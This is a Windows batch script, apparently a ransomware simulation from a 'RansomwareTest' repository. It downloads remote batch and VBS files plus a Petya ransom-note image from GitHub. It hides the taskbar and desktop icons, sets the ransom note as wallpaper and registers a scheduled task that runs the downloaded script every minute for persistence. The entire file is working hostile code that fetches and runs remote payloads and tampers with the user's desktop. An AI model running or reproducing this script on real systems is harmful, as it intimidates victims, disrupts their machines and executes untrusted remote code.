@echo off
set "TaskName=PopupTask"
set "url1=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
set "url2=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/hide.vbs"
set "wallpaperurl=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/petya-ransom-note.jpg"
set "wallpaperpath=C:\temp\petya-ransom-note.jpg"
set "Script1=C:\temp\popup.bat"
set "Script2=C:\temp\hide.vbs"

:: persistence
if not exist "C:\temp\" mkdir C:\temp
curl -L -o %Script1% %url1%
curl -L -o %Script2% %url2%
curl -L -o %wallpaperpath% %wallpaperurl%

:: being kind and saving old wallpaper location
for /f "tokens=3" %%a in ('reg query "HKCU\Control Panel\Desktop"  /V WallPaper ^|findstr /ri "REG_SZ"') do echo %%a > C:\temp\oldwallpaper.txt

:: Hide taskbar
powershell -command "&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;}"

:: Change wallpaper and hide icons, update
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %wallpaperpath% /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True
timeout 3

:: schtask for popup.bat
schtasks /Create /TN "%TaskName%" /TR "%Script2%" /SC MINUTE /MO 1 /RL LIMITED /F
schtasks /Run /TN %TaskName%
timeout 2

taskkill /f /im explorer.exe
start explorer.exe
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True
